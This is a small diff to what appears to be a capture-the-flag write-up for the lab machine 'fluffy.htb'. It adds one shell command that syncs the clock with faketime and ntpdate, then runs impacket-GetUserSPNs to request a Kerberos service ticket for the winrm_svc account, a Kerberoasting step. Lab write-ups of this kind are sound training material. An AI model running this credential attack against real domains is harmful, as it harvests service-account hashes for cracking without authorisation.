@@ -212,6 +212,10 @@ To simulate the difference in time when executing a command:
 
    faketime -f '+7h' <command>
 
+```shell
+faketime "$(ntpdate -q fluffy.htb | awk '{print $1" "$2}')" impacket-GetUserSPNs -dc-ip fluffy.htb fluffy.htb/p.agila -request-user winrm_svc
+```
+
 We can also try:
 
 ```shell
